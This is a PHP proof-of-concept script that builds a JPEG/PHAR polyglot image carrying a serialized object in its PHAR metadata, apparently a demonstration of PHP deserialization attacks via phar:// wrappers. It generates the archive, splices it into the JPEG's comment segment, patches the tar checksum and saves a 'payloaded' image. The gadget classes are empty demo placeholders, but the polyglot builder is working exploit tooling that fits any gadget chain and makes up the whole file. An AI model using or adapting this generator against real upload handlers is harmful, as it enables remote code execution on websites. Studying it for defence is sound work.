<?php
 function generate_base_phar($payloadObject, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("random.txt", "any text");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($payloadObject);
    $phar->stopBuffering();

    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6);
    $len = strlen($phar) + 2;
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calculate checksum
    $cheksum = 0;
    for ($i=0; $i<512; $i++){
        $cheksum += ord(substr($contents, $i, 1));
    }

    //embed checksum
    $oct = sprintf("%07o", $cheksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);

    return $contents;
}

// exploit classes
class Token
{
}

class HackedObject
{
}

$token = new Token();
$token->userData = "\r\nCracked user in 'wakeup' method;\r\n";

$payload = new HackedObject();
$payload->token = $token;
$payload->message = "Hacked message in destructor;\r\n";

$tempname = 'temp.tar.phar';
$basicImage = file_get_contents('images/hackerman.jpg');
$payloadedImage = 'images/hackerman-with-payload.jpg';
$prefix = '';

echo "Serialized payload:\r\n";
echo serialize($payload) . "\r\n";

// make jpg
file_put_contents($payloadedImage, generate_polyglot(generate_base_phar($payload, $prefix), $basicImage));